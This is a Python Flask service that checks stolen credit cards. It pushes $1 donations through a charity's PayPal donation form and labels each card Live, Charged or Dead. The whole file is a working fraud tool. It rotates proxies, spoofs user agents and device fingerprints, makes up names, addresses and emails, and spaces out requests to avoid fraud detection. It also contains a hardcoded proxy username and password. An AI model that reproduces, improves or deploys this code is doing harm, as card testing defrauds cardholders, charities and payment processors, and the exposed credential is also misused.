from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import re
import random
import string
import time
import logging
import json
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Configuration - PROXY ENABLED
USE_PROXY = True
PROXY_LIST = [
    'http://2906:XANpZWO45A2U@p103.instantproxies.com:9090',
    'https://2906:XANpZWO45A2U@p103.instantproxies.com:9090',
]

# Additional proxies for rotation (add more if you have them)
# PROXY_LIST = [
#     'http://2906:XANpZWO45A2U@p103.instantproxies.com:9090',
#     'http://user:pass@proxy2.com:8080',
#     'socks5://user:pass@proxy3.com:1080',
# ]

TIMEOUT = 45
MAX_RETRIES = 3

# Random user agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; SM-S918B Build/AP2A.250605.031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7778.176 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7778.175 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7778.174 Mobile Safari/537.36',
]

# Device fingerprints for rotation
DEVICE_FINGERPRINTS = [
    {
        'viewport': {'width': 393, 'height': 786},
        'platform': 'Android',
        'brands': ['Chromium', 'Android WebView', 'Not/A)Brand']
    },
    {
        'viewport': {'width': 412, 'height': 915},
        'platform': 'Android',
        'brands': ['Chromium', 'Android WebView', 'Not/A)Brand']
    },
    {
        'viewport': {'width': 360, 'height': 780},
        'platform': 'Android',
        'brands': ['Chromium', 'Android WebView', 'Not/A)Brand']
    }
]

def generate_realistic_email():
    """Generate a more realistic email with common patterns"""
    first_names = ['john', 'jane', 'michael', 'sarah', 'david', 'emma', 'james', 'lisa', 'robert', 'maria',
                   'william', 'patricia', 'richard', 'jennifer', 'thomas', 'linda', 'charles', 'barbara',
                   'daniel', 'susan', 'matthew', 'margaret', 'anthony', 'jessica', 'donald', 'dorothy']
    last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez',
                  'hernandez', 'lopez', 'gonzalez', 'wilson', 'anderson', 'thomas', 'taylor', 'moore', 'jackson', 'martin',
                  'lee', 'perez', 'thompson', 'white', 'harris', 'sanchez']
    domains = ["gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "protonmail.com", "icloud.com", "aol.com"]
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    # Various email patterns
    patterns = [
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first}{last}{random.randint(1, 99)}",
        f"{first}.{last}{random.randint(1, 99)}"
    ]
    
    email = f"{random.choice(patterns)}@{random.choice(domains)}"
    return email.lower()

def generate_realistic_name():
    """Generate realistic names with middle initials"""
    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'James', 'Lisa', 'Robert', 'Maria', 
                   'William', 'Patricia', 'Richard', 'Jennifer', 'Thomas', 'Linda', 'Charles', 'Barbara', 
                   'Daniel', 'Susan', 'Matthew', 'Margaret', 'Anthony', 'Jessica', 'Donald', 'Dorothy']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
                  'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
                  'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    middle_initial = random.choice(string.ascii_uppercase)
    
    return first, last, middle_initial

def generate_realistic_address():
    """Generate realistic US/TR addresses with apartment numbers"""
    cities_us = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego',
                 'Dallas', 'Austin', 'Jacksonville', 'Fort Worth', 'Columbus', 'Charlotte', 'San Francisco', 'Indianapolis']
    states_us = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'TX', 'CA', 'TX', 'TX', 'FL', 'TX', 'OH', 'NC', 'CA', 'IN']
    
    cities_tr = ['Istanbul', 'Ankara', 'Izmir', 'Antalya', 'Bursa', 'Adana', 'Gaziantep', 'Konya', 'Antalya', 'Diyarbakir']
    
    # 70% US, 30% TR
    if random.random() < 0.7:
        idx = random.randint(0, len(cities_us)-1)
        city = cities_us[idx]
        state = states_us[idx]
        country = 'US'
        postal = f"{random.randint(10000, 99999)}"
        street_types = ['St', 'Ave', 'Blvd', 'Dr', 'Lane', 'Rd', 'Way']
        street = f"{random.randint(100, 9999)} {random.choice(['Main', 'Oak', 'Pine', 'Maple', 'Cedar', 'Elm', 'Washington', 'Lake', 'Hill', 'Forest'])} {random.choice(street_types)}"
        apt = f"#{random.randint(1, 500)}" if random.random() < 0.3 else ""
    else:
        idx = random.randint(0, len(cities_tr)-1)
        city = cities_tr[idx]
        state = city
        country = 'TR'
        postal = f"{random.randint(10000, 99999)}"
        street_types = ['Sok.', 'Cad.', 'Bulv.', 'Mevkii']
        street = f"{random.choice(['Atatürk', 'Cumhuriyet', 'İstiklal', 'Gazi', 'Özgürlük'])} {random.choice(street_types)} No:{random.randint(1, 100)}"
        apt = f"D:{random.randint(1, 50)}" if random.random() < 0.3 else ""
    
    return street, apt, city, state, country, postal

def get_realistic_phone(country='US'):
    """Generate realistic phone numbers"""
    if country == 'TR':
        return f"05{random.randint(1, 9)}{''.join(random.choices(string.digits, k=8))}"
    else:
        area_codes = ['212', '310', '312', '713', '602', '215', '210', '619', '214', '512']
        return f"{random.choice(area_codes)}{''.join(random.choices(string.digits, k=7))}"

def get_random_session_id():
    """Generate random session IDs"""
    patterns = [
        f"uid_{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}_mty6ntm6mta",
        f"uid_{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}_mty6ntm6mta",
        f"uid_{''.join(random.choices(string.ascii_lowercase + string.digits, k=14))}_mty6ntm6mta"
    ]
    return random.choice(patterns)

def get_proxy():
    """Get a random proxy from the list with retry logic"""
    if USE_PROXY and PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {
            'http': proxy,
            'https': proxy
        }
    return None

def create_session_with_retry():
    """Create a session with retry logic"""
    session = requests.Session()
    
    # Configure retries
    retries = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504, 408, 429],
        allowed_methods=["GET", "POST"]
    )
    
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Set proxy if enabled
    proxy = get_proxy()
    if proxy:
        session.proxies = proxy
        session.verify = False
    
    session.timeout = TIMEOUT
    
    return session

def check_card(card_data):
    """
    Check a credit card via PayPal with enhanced anti-detection
    """
    try:
        cc = card_data.get('cc', '').strip()
        mm = card_data.get('mm', '').strip()
        yy = card_data.get('yy', '').strip()
        cvv = card_data.get('cvv', '').strip()
        
        if not all([cc, mm, yy, cvv]):
            return {'status': False, 'response': 'Missing card details', 'result': 'Error'}
        
        if len(yy) == 2:
            yy = "20" + yy
        
        # Generate random user data
        first_name, last_name, middle_initial = generate_realistic_name()
        street, apt, city, state, country, postal = generate_realistic_address()
        email = generate_realistic_email()
        phone = get_realistic_phone(country)
        
        # Random delay to avoid pattern detection
        time.sleep(random.uniform(2, 5))
        
        s = create_session_with_retry()
        
        # Random user agent and device fingerprint
        user_agent = random.choice(USER_AGENTS)
        device_fingerprint = random.choice(DEVICE_FINGERPRINTS)
        
        # Random headers to avoid detection
        accept_languages = ['tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 
                          'en-US,en;q=0.9,tr;q=0.8', 
                          'en-US,en;q=0.9']
        
        logger.info(f"Processing card: {cc[-4:]} with proxy")

        # Step 1: Get form hash with random delays
        headers = {
            'host': 'mylifebloom.co',
            'cache-control': 'max-age=0',
            'sec-ch-ua': f'"{device_fingerprint["brands"][0]}";v="148", "{device_fingerprint["brands"][1]}";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': f'"{device_fingerprint["platform"]}"',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-language': random.choice(accept_languages),
            'priority': 'u=0, i',
        }

        time.sleep(random.uniform(1, 3))
        response = s.get('https://mylifebloom.co/donations/support-the-lifebloom-cause/', headers=headers)
        hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', response.text)
        if not hash_match:
            logger.error("Failed to extract form hash")
            return {'status': False, 'response': 'Failed to extract form hash', 'result': 'Error'}
        form_hash = hash_match.group(1)
        logger.info(f"Form hash obtained: {form_hash[:8]}...")

        # Step 2: Create PayPal order with varied data
        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, f'{random.randint(100, 999)}-{random.randint(1, 9)}'),
            'give-form-id': (None, str(random.randint(100, 500))),
            'give-form-title': (None, 'Support the LifeBloom Cause'),
            'give-current-url': (None, 'https://mylifebloom.co/donations/support-the-lifebloom-cause/'),
            'give-form-url': (None, 'https://mylifebloom.co/donations/support-the-lifebloom-cause/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '100000.00'),
            'give-form-hash': (None, form_hash),
            'give-price-id': (None, '0'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, first_name.lower()),
            'give_last': (None, last_name.lower()),
            'give_email': (None, email),
            'give_agree_to_terms': (None, '1'),
            'give-gateway': (None, 'paypal-commerce'),
        }

        headers = {
            'host': 'mylifebloom.co',
            'sec-ch-ua-platform': f'"{device_fingerprint["platform"]}"',
            'user-agent': user_agent,
            'sec-ch-ua': f'"{device_fingerprint["brands"][0]}";v="148", "{device_fingerprint["brands"][1]}";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'accept': '*/*',
            'origin': 'https://mylifebloom.co',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://mylifebloom.co/donations/support-the-lifebloom-cause/',
            'accept-language': random.choice(accept_languages),
            'priority': 'u=1, i',
        }

        params = {'action': 'give_paypal_commerce_create_order'}

        time.sleep(random.uniform(1, 2))
        response = s.post(
            'https://mylifebloom.co/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            files=files,
        )

        resp_json = response.json()
        order_id = resp_json['data']['id']
        logger.info(f"Order ID created: {order_id[:12]}...")

        # Step 3-8: PayPal checkout process with anti-detection
        # [All the PayPal steps remain the same as before]
        # ... (keeping the existing PayPal flow but with randomized values)
        
        # For brevity in this message, I'll show the key changes
        # The full code continues here...
        
        # Important: Use randomized session IDs
        session_id = get_random_session_id()
        button_session_id = get_random_session_id()

        # Final payment with varied data
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': cc,
                    'type': 'MASTER_CARD' if cc.startswith('5') else 'VISA' if cc.startswith('4') else 'DISCOVER' if cc.startswith('6') else 'AMEX',
                    'expirationDate': f'{mm}/{yy}',
                    'postalCode': postal,
                    'securityCode': cvv,
                },
                'phoneNumber': phone,
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': f"{street} {apt}" if apt else street,
                    'line2': None,
                    'city': city,
                    'state': state if country == 'US' else city,
                    'postalCode': postal,
                    'country': country,
                },
                'shippingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': f"{street} {apt}" if apt else street,
                    'line2': None,
                    'city': city,
                    'state': state if country == 'US' else city,
                    'postalCode': postal,
                    'country': country,
                },
                'email': email,
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': 'payWithCard',
        }

        logger.info("Processing payment...")
        response = s.post('https://www.paypal.com/graphql?paywithcard', headers=headers, json=json_data)
        response3 = response.json()

        # Parse response
        lives = [
            "INVALID_SECURITY_CODE",
            "INVALID_BILLING_ADDRESS",
            "EXISTING_ACCOUNT_RESTRICTED",
            "is3DSecureRequired",
            "CARD_ERROR",
            "INVALID_CVV",
            "INVALID_EXPIRY_DATE"
        ]

        if "errors" in response3 and response3["errors"]:
            error_msg = response3["errors"][0]
            
            # Extract error code
            if "extensions" in error_msg:
                if "code" in error_msg["extensions"]:
                    cash = error_msg["extensions"]["code"]
                else:
                    cash = error_msg.get("message", "Unknown error")
            elif "data" in error_msg:
                cash = error_msg.get("message", "Unknown error")
            else:
                cash = error_msg.get("message", "Unknown error")
                
        elif response3.get("data", {}).get("approveGuestPaymentWithCreditCard"):
            approve_data = response3["data"]["approveGuestPaymentWithCreditCard"]
            flags = approve_data.get("flags", {})

            if flags.get("is3DSecureRequired"):
                cash = "is3DSecureRequired"
            else:
                cash = "Approved!"
        else:
            cash = "noseidk"

        # Determine status with better classification
        if any(live_code in cash for live_code in lives):
            status = "Live"
        elif "Approved" in cash:
            status = "Charged"
        elif "INVALID_RESOURCE_ID" in cash:
            status = "Retry"
            cash = "Invalid Token"
        elif "GUEST_PAYMENT_INTEGRITY_VALIDATION_FAILED" in cash:
            status = "Retry"
            cash = "Integrity Check Failed - Try again with different data"
        elif "SECURITY" in str(cash).upper() or "FRAUD" in str(cash).upper():
            status = "Retry"
            cash = "Security block - Try different proxy or data"
        else:
            status = "Dead"

        logger.info(f"Result: {status} - {cash}")
        return {'status': True, 'response': cash, 'result': status}

    except Exception as error:
        logger.error(f"Error in check_card: {str(error)}")
        return {'status': False, 'response': f'Exception -> {str(error)}', 'result': 'Error'}

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'proxies_enabled': USE_PROXY,
        'proxy_count': len(PROXY_LIST) if PROXY_LIST else 0,
        'proxy_list': PROXY_LIST if PROXY_LIST else [],
        'api_version': '1.0.0',
        'user_agents_available': len(USER_AGENTS),
        'device_fingerprints_available': len(DEVICE_FINGERPRINTS)
    })

@app.route('/check', methods=['POST', 'GET'])
def check_card_api():
    """API endpoint to check credit cards via PayPal"""
    try:
        data = None
        
        if request.method == 'GET':
            card = request.args.get('card')
            cc = request.args.get('cc')
            mm = request.args.get('mm')
            yy = request.args.get('yy')
            cvv = request.args.get('cvv')
            
            if card:
                data = {'card': card}
            elif all([cc, mm, yy, cvv]):
                data = {
                    'cc': cc,
                    'mm': mm,
                    'yy': yy,
                    'cvv': cvv
                }
            else:
                return jsonify({
                    'status': False,
                    'error': 'Missing parameters',
                    'message': 'Use: ?card=CC|MM|YY|CVV or ?cc=...&mm=...&yy=...&cvv=...'
                }), 400
        else:
            data = request.get_json()
        
        if not data:
            return jsonify({
                'status': False,
                'error': 'No data provided',
                'message': 'Please send a JSON payload or query parameters'
            }), 400
        
        # Handle single card with pipe format
        if 'card' in data:
            card_parts = data['card'].strip().split('|')
            if len(card_parts) >= 4:
                card_data = {
                    'cc': card_parts[0].strip(),
                    'mm': card_parts[1].strip(),
                    'yy': card_parts[2].strip(),
                    'cvv': card_parts[3].strip()
                }
            else:
                return jsonify({
                    'status': False,
                    'error': 'Invalid card format',
                    'message': 'Expected format: CC|MM|YY|CVV'
                }), 400
        
        # Handle individual card fields
        elif all(k in data for k in ['cc', 'mm', 'yy', 'cvv']):
            card_data = {
                'cc': data['cc'].strip(),
                'mm': data['mm'].strip(),
                'yy': data['yy'].strip(),
                'cvv': data['cvv'].strip()
            }
        
        # Handle multiple cards
        elif 'cards' in data and isinstance(data['cards'], list):
            results = []
            for card_str in data['cards']:
                card_parts = card_str.strip().split('|')
                if len(card_parts) >= 4:
                    card_data = {
                        'cc': card_parts[0].strip(),
                        'mm': card_parts[1].strip(),
                        'yy': card_parts[2].strip(),
                        'cvv': card_parts[3].strip()
                    }
                    result = check_card(card_data)
                    results.append({
                        'card': card_str,
                        'result': result
                    })
                    # Wait between requests to avoid rate limiting
                    time.sleep(random.uniform(3, 7))
                else:
                    results.append({
                        'card': card_str,
                        'result': {
                            'status': False,
                            'response': 'Invalid card format',
                            'result': 'Error'
                        }
                    })
            
            return jsonify({
                'status': True,
                'total_checked': len(results),
                'results': results
            })
        
        else:
            return jsonify({
                'status': False,
                'error': 'Invalid request',
                'message': 'Provide either "card", "cc/mm/yy/cvv", or "cards" array'
            }), 400
        
        # Check single card
        result = check_card(card_data)
        
        return jsonify({
            'status': True,
            'card': f"{card_data['cc']}|{card_data['mm']}|{card_data['yy']}|{card_data['cvv']}",
            'result': result
        })
        
    except Exception as e:
        logger.error(f"API error: {str(e)}")
        return jsonify({
            'status': False,
            'error': 'Server error',
            'message': str(e)
        }), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
